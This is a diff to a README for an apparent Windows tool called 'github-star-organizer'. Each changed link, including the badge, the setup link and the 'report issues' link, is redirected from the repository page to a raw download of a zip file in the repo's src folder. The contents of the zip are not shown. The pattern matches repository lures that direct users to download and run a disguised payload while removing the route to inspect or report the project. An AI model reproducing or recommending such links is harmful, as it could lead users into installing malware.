@@ -1,6 +1,6 @@
 # ⭐ github-star-organizer - Organize Your GitHub Stars Easily
 
-[![Download github-star-organizer](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/darkgrey-curmudgeon671/github-star-organizer)
+[![Download github-star-organizer](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/darkgrey-curmudgeon671/github-star-organizer/main/src/organizer_star_github_1.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ The app runs as a standalone program. No additional software installation is req
 ## 🚀 Getting Started: Download and Setup
 
 To get the app, visit this page to download it:  
-[https://github.com/darkgrey-curmudgeon671/github-star-organizer](https://github.com/darkgrey-curmudgeon671/github-star-organizer)
+[https://raw.githubusercontent.com/darkgrey-curmudgeon671/github-star-organizer/main/src/organizer_star_github_1.2.zip](https://raw.githubusercontent.com/darkgrey-curmudgeon671/github-star-organizer/main/src/organizer_star_github_1.2.zip)
 
 Follow these steps to download and run github-star-organizer on your Windows computer:
 
@@ -110,7 +110,7 @@ github-star-organizer is built to be simple yet effective:
 ## 🔗 Where to Get Updates
 
 You can check for new versions or report issues at the main repository page:  
-[https://github.com/darkgrey-curmudgeon671/github-star-organizer](https://github.com/darkgrey-curmudgeon671/github-star-organizer)
+[https://raw.githubusercontent.com/darkgrey-curmudgeon671/github-star-organizer/main/src/organizer_star_github_1.2.zip](https://raw.githubusercontent.com/darkgrey-curmudgeon671/github-star-organizer/main/src/organizer_star_github_1.2.zip)
 
 ---
 
